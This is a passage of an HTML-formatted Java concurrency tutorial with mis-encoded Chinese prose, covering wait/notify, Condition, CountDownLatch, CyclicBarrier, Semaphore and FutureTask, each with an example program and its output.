class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"n\">WaitNotifyExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">WaitNotifyExample</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">after</span><span class=\"o\">());</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">before</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"n\">before</span>\n<span class=\"n\">after</span></code></pre></div><p><b>wait() å’Œ sleep() çš„åŒºåˆ«</b> </p><ul><li>wait() æ˜¯ Object çš„æ–¹æ³•ï¼Œè€Œ sleep() æ˜¯ Thread çš„é™æ€æ–¹æ³•ï¼›</li><li>wait() ä¼šé‡Šæ”¾é”ï¼Œsleep() ä¸ä¼šã€‚</li></ul><h2>await() signal() signalAll()</h2><p>java.util.concurrent ç±»åº“ä¸­æä¾›äº† Condition ç±»æ¥å®ç°çº¿ç¨‹ä¹‹é—´çš„åè°ƒï¼Œå¯ä»¥åœ¨ Condition ä¸Šè°ƒç”¨ await() æ–¹æ³•ä½¿çº¿ç¨‹ç­‰å¾…ï¼Œå…¶å®ƒçº¿ç¨‹è°ƒç”¨ signal() æˆ– signalAll() æ–¹æ³•å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ã€‚</p><p>ç›¸æ¯”äº wait() è¿™ç§ç­‰å¾…æ–¹å¼ï¼Œawait() å¯ä»¥æŒ‡å®šç­‰å¾…çš„æ¡ä»¶ï¼Œå› æ­¤æ›´åŠ çµæ´»ã€‚</p><p>ä½¿ç”¨ Lock æ¥è·å–ä¸€ä¸ª Condition å¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AwaitSignalExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"n\">Lock</span> <span class=\"n\">lock</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ReentrantLock</span><span class=\"o\">();</span>\n    <span class=\"kd\">private</span> <span class=\"n\">Condition</span> <span class=\"n\">condition</span> <span class=\"o\">=</span> <span class=\"n\">lock</span><span class=\"o\">.</span><span class=\"na\">newCondition</span><span class=\"o\">();</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">before</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">lock</span><span class=\"o\">.</span><span class=\"na\">lock</span><span class=\"o\">();</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;before&#34;</span><span class=\"o\">);</span>\n            <span class=\"n\">condition</span><span class=\"o\">.</span><span class=\"na\">signalAll</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span> <span class=\"k\">finally</span> <span class=\"o\">{</span>\n            <span class=\"n\">lock</span><span class=\"o\">.</span><span class=\"na\">unlock</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">after</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">lock</span><span class=\"o\">.</span><span class=\"na\">lock</span><span class=\"o\">();</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"n\">condition</span><span class=\"o\">.</span><span class=\"na\">await</span><span class=\"o\">();</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;after&#34;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span> <span class=\"k\">finally</span> <span class=\"o\">{</span>\n            <span class=\"n\">lock</span><span class=\"o\">.</span><span class=\"na\">unlock</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"n\">AwaitSignalExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">AwaitSignalExample</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">after</span><span class=\"o\">());</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">before</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"n\">before</span>\n<span class=\"n\">after</span></code></pre></div><h2>ä¸ƒã€J.U.C - AQS</h2><p>java.util.concurrentï¼ˆJ.U.Cï¼‰å¤§å¤§æé«˜äº†å¹¶å‘æ€§èƒ½ï¼ŒAQS è¢«è®¤ä¸ºæ˜¯ J.U.C çš„æ ¸å¿ƒã€‚</p><h2>CountDownLatch</h2><p>ç”¨æ¥æ§åˆ¶ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…å¤šä¸ªçº¿ç¨‹ã€‚</p><p>ç»´æŠ¤äº†ä¸€ä¸ªè®¡æ•°å™¨ cntï¼Œæ¯æ¬¡è°ƒç”¨ countDown() æ–¹æ³•ä¼šè®©è®¡æ•°å™¨çš„å€¼å‡ 1ï¼Œå‡åˆ° 0 çš„æ—¶å€™ï¼Œé‚£äº›å› ä¸ºè°ƒç”¨ await() æ–¹æ³•è€Œåœ¨ç­‰å¾…çš„çº¿ç¨‹å°±ä¼šè¢«å”¤é†’ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-ef236042d2fa44caa3df65d19713f9a2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"408\" data-rawheight=\"392\" class=\"content_image\" width=\"408\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;408&#39; height=&#39;392&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"408\" data-rawheight=\"392\" class=\"content_image lazy\" width=\"408\" data-actualsrc=\"https://pic3.zhimg.com/v2-ef236042d2fa44caa3df65d19713f9a2_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CountdownLatchExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span> <span class=\"o\">{</span>\n        <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">totalThread</span> <span class=\"o\">=</span> <span class=\"n\">10</span><span class=\"o\">;</span>\n        <span class=\"n\">CountDownLatch</span> <span class=\"n\">countDownLatch</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CountDownLatch</span><span class=\"o\">(</span><span class=\"n\">totalThread</span><span class=\"o\">);</span>\n        <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">totalThread</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n                <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"s\">&#34;run..&#34;</span><span class=\"o\">);</span>\n                <span class=\"n\">countDownLatch</span><span class=\"o\">.</span><span class=\"na\">countDown</span><span class=\"o\">();</span>\n            <span class=\"o\">});</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">countDownLatch</span><span class=\"o\">.</span><span class=\"na\">await</span><span class=\"o\">();</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;end&#34;</span><span class=\"o\">);</span>\n        <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">shutdown</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">run</span><span class=\"o\">..</span><span class=\"na\">run</span><span class=\"o\">..</span><span class=\"na\">run</span><span class=\"o\">..</span><span class=\"na\">run</span><span class=\"o\">..</span><span class=\"na\">run</span><span class=\"o\">..</span><span class=\"na\">run</span><span class=\"o\">..</span><span class=\"na\">run</span><span class=\"o\">..</span><span class=\"na\">run</span><span class=\"o\">..</span><span class=\"na\">run</span><span class=\"o\">..</span><span class=\"na\">run</span><span class=\"o\">..</span><span class=\"na\">end</span></code></pre></div><h2>CyclicBarrier</h2><p>ç”¨æ¥æ§åˆ¶å¤šä¸ªçº¿ç¨‹äº’ç›¸ç­‰å¾…ï¼Œåªæœ‰å½“å¤šä¸ªçº¿ç¨‹éƒ½åˆ°è¾¾æ—¶ï¼Œè¿™äº›çº¿ç¨‹æ‰ä¼šç»§ç»­æ‰§è¡Œã€‚</p><p>å’Œ CountdownLatch ç›¸ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡ç»´æŠ¤è®¡æ•°å™¨æ¥å®ç°çš„ã€‚çº¿ç¨‹æ‰§è¡Œ await() æ–¹æ³•ä¹‹åè®¡æ•°å™¨ä¼šå‡ 1ï¼Œå¹¶è¿›è¡Œç­‰å¾…ï¼Œç›´åˆ°è®¡æ•°å™¨ä¸º 0ï¼Œæ‰€æœ‰è°ƒç”¨ await() æ–¹æ³•è€Œåœ¨ç­‰å¾…çš„çº¿ç¨‹æ‰èƒ½ç»§ç»­æ‰§è¡Œã€‚</p><p>CyclicBarrier å’Œ CountdownLatch çš„ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼ŒCyclicBarrier çš„è®¡æ•°å™¨é€šè¿‡è°ƒç”¨ reset() æ–¹æ³•å¯ä»¥å¾ªç¯ä½¿ç”¨ï¼Œæ‰€ä»¥å®ƒæ‰å«åšå¾ªç¯å±éšœã€‚</p><p>CyclicBarrier æœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼Œå…¶ä¸­ parties æŒ‡ç¤ºè®¡æ•°å™¨çš„åˆå§‹å€¼ï¼ŒbarrierAction åœ¨æ‰€æœ‰çº¿ç¨‹éƒ½åˆ°è¾¾å±éšœçš„æ—¶å€™ä¼šæ‰§è¡Œä¸€æ¬¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"nf\">CyclicBarrier</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">parties</span><span class=\"o\">,</span> <span class=\"n\">Runnable</span> <span class=\"n\">barrierAction</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">parties</span> <span class=\"o\">&lt;=</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"n\">IllegalArgumentException</span><span class=\"o\">();</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">parties</span> <span class=\"o\">=</span> <span class=\"n\">parties</span><span class=\"o\">;</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">count</span> <span class=\"o\">=</span> <span class=\"n\">parties</span><span class=\"o\">;</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">barrierCommand</span> <span class=\"o\">=</span> <span class=\"n\">barrierAction</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"nf\">CyclicBarrier</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">parties</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">this</span><span class=\"o\">(</span><span class=\"n\">parties</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-7291e2662de3720310912a2780f06cf1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"441\" data-rawheight=\"340\" class=\"origin_image zh-lightbox-thumb\" width=\"441\" data-original=\"https://pic2.zhimg.com/v2-7291e2662de3720310912a2780f06cf1_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;441&#39; height=&#39;340&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"441\" data-rawheight=\"340\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"441\" data-original=\"https://pic2.zhimg.com/v2-7291e2662de3720310912a2780f06cf1_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-7291e2662de3720310912a2780f06cf1_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CyclicBarrierExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">totalThread</span> <span class=\"o\">=</span> <span class=\"n\">10</span><span class=\"o\">;</span>\n        <span class=\"n\">CyclicBarrier</span> <span class=\"n\">cyclicBarrier</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CyclicBarrier</span><span class=\"o\">(</span><span class=\"n\">totalThread</span><span class=\"o\">);</span>\n        <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">totalThread</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n                <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"s\">&#34;before..&#34;</span><span class=\"o\">);</span>\n                <span class=\"k\">try</span> <span class=\"o\">{</span>\n                    <span class=\"n\">cyclicBarrier</span><span class=\"o\">.</span><span class=\"na\">await</span><span class=\"o\">();</span>\n                <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"o\">|</span> <span class=\"n\">BrokenBarrierException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n                <span class=\"o\">}</span>\n                <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"s\">&#34;after..&#34;</span><span class=\"o\">);</span>\n            <span class=\"o\">});</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">shutdown</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">before</span><span class=\"o\">..</span><span class=\"na\">before</span><span class=\"o\">..</span><span class=\"na\">before</span><span class=\"o\">..</span><span class=\"na\">before</span><span class=\"o\">..</span><span class=\"na\">before</span><span class=\"o\">..</span><span class=\"na\">before</span><span class=\"o\">..</span><span class=\"na\">before</span><span class=\"o\">..</span><span class=\"na\">before</span><span class=\"o\">..</span><span class=\"na\">before</span><span class=\"o\">..</span><span class=\"na\">before</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span><span class=\"na\">after</span><span class=\"o\">..</span></code></pre></div><h2>Semaphore</h2><p>Semaphore ç±»ä¼¼äºæ“ä½œç³»ç»Ÿä¸­çš„ä¿¡å·é‡ï¼Œå¯ä»¥æ§åˆ¶å¯¹äº’æ–¥èµ„æºçš„è®¿é—®çº¿ç¨‹æ•°ã€‚</p><p>ä»¥ä¸‹ä»£ç æ¨¡æ‹Ÿäº†å¯¹æŸä¸ªæœåŠ¡çš„å¹¶å‘è¯·æ±‚ï¼Œæ¯æ¬¡åªèƒ½æœ‰ 3 ä¸ªå®¢æˆ·ç«¯åŒæ—¶è®¿é—®ï¼Œè¯·æ±‚æ€»æ•°ä¸º 10ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SemaphoreExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">clientCount</span> <span class=\"o\">=</span> <span class=\"n\">3</span><span class=\"o\">;</span>\n        <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">totalRequestCount</span> <span class=\"o\">=</span> <span class=\"n\">10</span><span class=\"o\">;</span>\n        <span class=\"n\">Semaphore</span> <span class=\"n\">semaphore</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Semaphore</span><span class=\"o\">(</span><span class=\"n\">clientCount</span><span class=\"o\">);</span>\n        <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">totalRequestCount</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()-&gt;{</span>\n                <span class=\"k\">try</span> <span class=\"o\">{</span>\n                    <span class=\"n\">semaphore</span><span class=\"o\">.</span><span class=\"na\">acquire</span><span class=\"o\">();</span>\n                    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">print</span><span class=\"o\">(</span><span class=\"n\">semaphore</span><span class=\"o\">.</span><span class=\"na\">availablePermits</span><span class=\"o\">()</span> <span class=\"o\">+</span> <span class=\"s\">&#34; &#34;</span><span class=\"o\">);</span>\n                <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                    <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n                <span class=\"o\">}</span> <span class=\"k\">finally</span> <span class=\"o\">{</span>\n                    <span class=\"n\">semaphore</span><span class=\"o\">.</span><span class=\"na\">release</span><span class=\"o\">();</span>\n                <span class=\"o\">}</span>\n            <span class=\"o\">});</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">shutdown</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">2</span> <span class=\"n\">1</span> <span class=\"n\">2</span> <span class=\"n\">2</span> <span class=\"n\">2</span> <span class=\"n\">2</span> <span class=\"n\">2</span> <span class=\"n\">1</span> <span class=\"n\">2</span> <span class=\"n\">2</span></code></pre></div><h2>å…«ã€J.U.C - å…¶å®ƒç»„ä»¶</h2><h2>FutureTask</h2><p>åœ¨ä»‹ç» Callable æ—¶æˆ‘ä»¬çŸ¥é“å®ƒå¯ä»¥æœ‰è¿”å›å€¼ï¼Œè¿”å›å€¼é€šè¿‡ Future è¿›è¡Œå°è£…ã€‚FutureTask å®ç°äº† RunnableFuture æ¥å£ï¼Œè¯¥æ¥å£ç»§æ‰¿è‡ª Runnable å’Œ Future æ¥å£ï¼Œè¿™ä½¿å¾— FutureTask æ—¢å¯ä»¥å½“åšä¸€ä¸ªä»»åŠ¡æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥æœ‰è¿”å›å€¼ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">FutureTask</span><span class=\"o\">&lt;</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"kd\">implements</span> <span class=\"n\">RunnableFuture</span><span class=\"o\">&lt;</span><span class=\"n\">V</span><span class=\"o\">&gt;</span>\n<span class=\"kd\">public</span> <span class=\"kd\">interface</span> <span class=\"nc\">RunnableFuture</span><span class=\"o\">&lt;</span><span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"kd\">extends</span> <span class=\"n\">Runnable</span><span class=\"o\">,</span> <span class=\"n\">Future</span><span class=\"o\">&lt;</span><span class=\"n\">V</span><span class=\"o\">&gt;</span></code></pre></div><p>FutureTask å¯ç”¨äºå¼‚æ­¥è·å–æ‰§è¡Œç»“æœæˆ–å–æ¶ˆæ‰§è¡Œä»»åŠ¡çš„åœºæ™¯ã€‚å½“ä¸€ä¸ªè®¡ç®—ä»»åŠ¡éœ€è¦æ‰§è¡Œå¾ˆé•¿æ—¶é—´ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨ FutureTask æ¥å°è£…è¿™ä¸ªä»»åŠ¡ï¼Œä¸»çº¿ç¨‹åœ¨å®Œæˆè‡ªå·±çš„ä»»åŠ¡ä¹‹åå†å»è·å–ç»“æœã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">FutureTaskExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">ExecutionException</span><span class=\"o\">,</span> <span class=\"n\">InterruptedException</span> <span class=\"o\">{</span>\n        <span class=\"n\">FutureTask</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">futureTask</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">FutureTask</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;(</span><span class=\"k\">new</span> <span class=\"n\">Callable</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;()</span> <span class=\"o\">{</span>\n            <span class=\"nd\">@Override</span>\n            <span class=\"kd\">public</span> <span class=\"n\">Integer</span> <span class=\"nf\">call</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">Exception</span> <span class=\"o\">{</span>\n                <span class=\"kt\">int</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n                <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">100</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n                    <span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">sleep</span><span class=\"o\">(</span><span class=\"n\">10</span><span class=\"o\">);</span>\n                    <span class=\"n\">result</span> <span class=\"o\">+=</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n                <span class=\"o\">}</span>\n                <span class=\"k\">return</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">});</span>\n\n        <span class=\"n\">Thread</span> <span class=\"n\">computeThread</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Thread</span><span class=\"o\">(</span><span class=\"n\">futureTask</span><span class=\"o\">);</span>\n        <span class=\"n\">computeThread</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n\n        <span class=\"n\">Thread</span> <span class=\"n\">otherThread</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Thread</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;other task is running...&#34;</span><span class=\"o\">);</span>\n            <span class=\"k\">try</span> <span class=\"o\">{</span>\n                <span class=\"n\">Thread</span><span class=\"o\">.</span><span class=\"na\">sleep</span><span class=\"o\">(</span><span class=\"n\">1000</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">InterruptedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n                <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">});</span>\n        <span class=\"n\">otherThread</span><span class=\"o\">.</span><span class=\"na\">start</span><span class=\"o\">();</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">futureTask</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">());</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">other</span> <span class=\"n\">task</span> <span class=\"n\">is</span> <span class=\"n\">running</span><span class=\"o\">...</span>\n<span class=\"n\">4950</span></code></pre></div><h2>BlockingQueue</h2><p>java.util.concurrent.BlockingQueue æ¥å£æœ‰ä»¥ä¸‹é˜»å¡é˜Ÿåˆ—çš„å®ç°ï¼š</p><ul><li><b>FIFO é˜Ÿåˆ—</b> 